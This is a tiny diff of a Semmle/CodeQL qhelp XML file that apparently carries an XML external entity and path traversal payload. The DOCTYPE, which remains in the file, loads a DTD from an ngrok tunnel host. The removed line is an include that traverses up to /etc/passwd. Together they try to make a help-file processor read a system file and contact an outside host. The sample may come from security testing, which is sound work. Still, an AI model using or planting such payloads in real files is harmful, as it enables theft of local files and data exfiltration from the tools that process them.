@@ -2,5 +2,4 @@
   "-//Semmle//qhelp//EN"
   "http://c6ecbc47.ngrok.io/qhelp.dtd">
 <qhelp>
-<include src="../../../../../../../../../../../etc/passwd"/>
 </qhelp>
